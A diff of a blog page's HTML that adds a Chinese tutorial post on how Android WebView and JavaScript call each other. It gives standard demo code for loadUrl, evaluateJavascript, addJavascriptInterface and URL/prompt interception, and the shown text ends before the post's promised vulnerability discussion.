@@ -317,6 +317,314 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/WebViewSec/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/WebViewSec/index.html" itemprop="url">
+                  WebView与Android java层交互以及可能出现的漏洞
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-07-06 17:59:28 / Modified: 23:30:58" itemprop="dateCreated datePublished" datetime="2019-07-06T17:59:28+08:00">2019-07-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="WebView-以及可能出现的漏洞"><a href="#WebView-以及可能出现的漏洞" class="headerlink" title="WebView 以及可能出现的漏洞"></a>WebView 以及可能出现的漏洞</h2><p>WebView广泛应用于各种App中，通过引入WebUI的方法加速APP的开发。这篇文章主要介绍WebView与JS交互的几种方式以及可能存在的漏洞情况。</p>
+<h3 id="Android调用JS代码"><a href="#Android调用JS代码" class="headerlink" title="Android调用JS代码"></a>Android调用JS代码</h3><p>主要有两种方式：</p>
+<ul>
+<li>WebView的loadUrl()</li>
+<li>WebView的evaluateJavascript()</li>
+</ul>
+<h4 id="loadUrl"><a href="#loadUrl" class="headerlink" title="loadUrl"></a>loadUrl</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 文本名：javascript</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson_Ho<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">// JS代码</span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Android需要调用的方法</span></span></span><br><span class="line"><span class="javascript">   <span class="function"><span class="keyword">function</span> <span class="title">callJS</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      alert(<span class="string">"Android调用了JS的callJS方法"</span>);</span></span><br><span class="line"><span class="undefined">   &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">       button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">               <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">               mWebView.post(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                   <span class="meta">@Override</span></span><br><span class="line">                   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                       <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                       <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                       mWebView.loadUrl(<span class="string">"javascript:callJS()"</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;);</span><br><span class="line">               </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"><span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line">       <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line">       <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line">       <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line">       mWebView.setWebChromeClient(<span class="keyword">new</span> WebChromeClient() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> </span>&#123;</span><br><span class="line">               AlertDialog.Builder b = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">               b.setTitle(<span class="string">"Alert"</span>);</span><br><span class="line">               b.setMessage(message);</span><br><span class="line">               b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">                   <span class="meta">@Override</span></span><br><span class="line">                   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">                       result.confirm();</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;);</span><br><span class="line">               b.setCancelable(<span class="keyword">false</span>);</span><br><span class="line">               b.create().show();</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure>
+<p>JS代码必须在<code>onPageFinished()</code>之后调用。</p>
+<h4 id="evaluateJavascript"><a href="#evaluateJavascript" class="headerlink" title="evaluateJavascript()"></a>evaluateJavascript()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只需要将第一种方法的loadUrl()换成下面该方法即可</span></span><br><span class="line">    mWebView.evaluateJavascript（<span class="string">"javascript:callJS()"</span>, <span class="keyword">new</span> ValueCallback&lt;String&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceiveValue</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对比</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL3VwbG9hZC1pbWFnZXMuamlhbnNodS5pby91cGxvYWRfaW1hZ2VzLzk0NDM2NS0zMGYwOTVkNGM5ZTYzOGZkLnBuZz9pbWFnZU1vZ3IyL2F1dG8tb3JpZW50L3N0cmlwJTdDaW1hZ2VWaWV3Mi8yL3cvMTI0MA" alt="æ¹å¼å¯¹æ¯å¾"></p>
+<p>开发中多使用evaluateJavascript()</p>
+<h3 id="JS调用Java层提供的方法"><a href="#JS调用Java层提供的方法" class="headerlink" title="JS调用Java层提供的方法"></a>JS调用Java层提供的方法</h3><p>这里有三种方法：</p>
+<ul>
+<li>通过WebView的addJavascriptInterface（）进行对象映射</li>
+<li>通过 WebViewClient 的shouldOverrideUrlLoading ()方法回调拦截 url</li>
+<li>通过 WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）方法回调拦截JS对话框alert()、confirm()、prompt（） 消息</li>
+<li>WebViewJavascriptBridge</li>
+</ul>
+<h4 id="addJavascriptInterface-方法"><a href="#addJavascriptInterface-方法" class="headerlink" title="addJavascriptInterface()方法"></a>addJavascriptInterface()方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承自Object类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AndroidtoJs</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line"><span class="comment">// 定义JS需要调用的方法</span></span><br><span class="line"><span class="comment">// 被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line"><span class="meta">@JavascriptInterface</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"JS调用了Android的hello方法"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">         </span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="javascript">         <span class="function"><span class="keyword">function</span> <span class="title">callAndroid</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span><br><span class="line"><span class="javascript">            test.hello(<span class="string">"js调用了android中的hello方法"</span>);</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      //点击按钮则调用callAndroid函数</span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button1"</span> "<span class="attr">callAndroid</span>()"&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    WebView mWebView;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        mWebView = (WebView) findViewById(R.id.webview);</span><br><span class="line">        WebSettings webSettings = mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line">        <span class="comment">//参数1：Javascript对象名</span></span><br><span class="line">        <span class="comment">//参数2：Java对象名</span></span><br><span class="line">        mWebView.addJavascriptInterface(<span class="keyword">new</span> AndroidtoJs(), <span class="string">"test"</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">"file:///android_asset/javascript.html"</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="shouldOverrideURlLoading-方法回调拦截url"><a href="#shouldOverrideURlLoading-方法回调拦截url" class="headerlink" title="shouldOverrideURlLoading()方法回调拦截url"></a>shouldOverrideURlLoading()方法回调拦截url</h3><p>用<code>shouldOverrideUrlLoading()</code>方法拦截特定协议的url跳转，解析协议并调用相应的方法</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson_Ho<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">         <span class="function"><span class="keyword">function</span> <span class="title">callAndroid</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">/*约定的url协议为：js://webview?arg1=111&amp;arg2=222*/</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.location = <span class="string">"js://webview?arg1=111&amp;arg2=222"</span>;</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 点击按钮则调用callAndroid（）方法  --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button1"</span> "<span class="attr">callAndroid</span>()"&gt;</span>点击调用Android代码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setWebViewClient(<span class="keyword">new</span> WebViewClient() &#123;</span><br><span class="line">                                      <span class="meta">@Override</span></span><br><span class="line">                                      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                                          <span class="comment">// 步骤2：根据协议的参数，判断是否是所需要的url</span></span><br><span class="line">                                          <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line">                                          <span class="comment">//假定传入进来的 url = "js://webview?arg1=111&amp;arg2=222"（同时也是约定好的需要拦截的）</span></span><br><span class="line"></span><br><span class="line">                                          Uri uri = Uri.parse(url);                                 </span><br><span class="line">                                          <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">                                          <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">                                          <span class="keyword">if</span> ( uri.getScheme().equals(<span class="string">"js"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                              <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                                              <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                                              <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">"webview"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                                 <span class="comment">//  步骤3：</span></span><br><span class="line">                                                  <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                                                  System.out.println(<span class="string">"js调用了Android的方法"</span>);</span><br><span class="line">                                                  <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                                                  HashMap&lt;String, String&gt; params = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">                                                  Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line"></span><br><span class="line">                                              &#125;</span><br><span class="line"></span><br><span class="line">                                              <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                                          &#125;</span><br><span class="line">                                          <span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                                      &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这种方法在获取URL的返回值上比较复杂</li>
+</ul>
+<h3 id="onJsAlert-onJsConfirm-onJsPrompt-方法回调拦截JS对话框消息"><a href="#onJsAlert-onJsConfirm-onJsPrompt-方法回调拦截JS对话框消息" class="headerlink" title="onJsAlert() onJsConfirm() onJsPrompt()方法回调拦截JS对话框消息"></a>onJsAlert() onJsConfirm() onJsPrompt()方法回调拦截JS对话框消息</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson_Ho<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="javascript">	<span class="function"><span class="keyword">function</span> <span class="title">clickprompt</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 调用prompt（）</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> result=prompt(<span class="string">"js://demo?arg1=111&amp;arg2=222"</span>);</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">"demo "</span> + result);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 点击按钮则调用clickprompt()  --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"button1"</span> "<span class="attr">clickprompt</span>()"&gt;</span>点击调用Android代码<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setWebChromeClient(<span class="keyword">new</span> WebChromeClient() &#123;</span><br><span class="line">                                        <span class="comment">// 拦截输入框(原理同方式2)</span></span><br><span class="line">                                        <span class="comment">// 参数message:代表promt（）的内容（不是url）</span></span><br><span class="line">                                        <span class="comment">// 参数result:代表输入框的返回值</span></span><br><span class="line">                                        <span class="meta">@Override</span></span><br><span class="line">                                        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsPrompt</span><span class="params">(WebView view, String url, String message, String defaultValue, JsPromptResult result)</span> </span>&#123;</span><br><span class="line">                                            <span class="comment">// 根据协议的参数，判断是否是所需要的url(原理同方式2)</span></span><br><span class="line">                                            <span class="comment">// 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span></span><br><span class="line">                                            <span class="comment">//假定传入进来的 url = "js://webview?arg1=111&amp;arg2=222"（同时也是约定好的需要拦截的）</span></span><br><span class="line"></span><br><span class="line">                                            Uri uri = Uri.parse(message);</span><br><span class="line">                                            <span class="comment">// 如果url的协议 = 预先约定的 js 协议</span></span><br><span class="line">                                            <span class="comment">// 就解析往下解析参数</span></span><br><span class="line">                                            <span class="keyword">if</span> ( uri.getScheme().equals(<span class="string">"js"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                                <span class="comment">// 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span></span><br><span class="line">                                                <span class="comment">// 所以拦截url,下面JS开始调用Android需要的方法</span></span><br><span class="line">                                                <span class="keyword">if</span> (uri.getAuthority().equals(<span class="string">"webview"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                                                    <span class="comment">//</span></span><br><span class="line">                                                    <span class="comment">// 执行JS所需要调用的逻辑</span></span><br><span class="line">                                                    System.out.println(<span class="string">"js调用了Android的方法"</span>);</span><br><span class="line">                                                    <span class="comment">// 可以在协议上带有参数并传递到Android上</span></span><br><span class="line">                                                    HashMap&lt;String, String&gt; params = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">                                                    Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line"></span><br><span class="line">                                                    <span class="comment">//参数result:代表消息框的返回值(输入值)</span></span><br><span class="line">                                                    result.confirm(<span class="string">"js调用了Android的方法成功啦"</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="keyword">super</span>.onJsPrompt(view, url, message, defaultValue, result);</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过alert()和confirm()拦截的原理相同，此处不作过多讲述</span></span><br><span class="line"></span><br><span class="line">                                        <span class="comment">// 拦截JS的警告框</span></span><br><span class="line">                                        <span class="meta">@Override</span></span><br><span class="line">                                        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsAlert</span><span class="params">(WebView view, String url, String message, JsResult result)</span> </span>&#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="keyword">super</span>.onJsAlert(view, url, message, result);</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                        <span class="comment">// 拦截JS的确认框</span></span><br><span class="line">                                        <span class="meta">@Override</span></span><br><span class="line">                                        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsConfirm</span><span class="params">(WebView view, String url, String message, JsResult result)</span> </span>&#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="keyword">super</span>.onJsConfirm(view, url, message, result);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure>
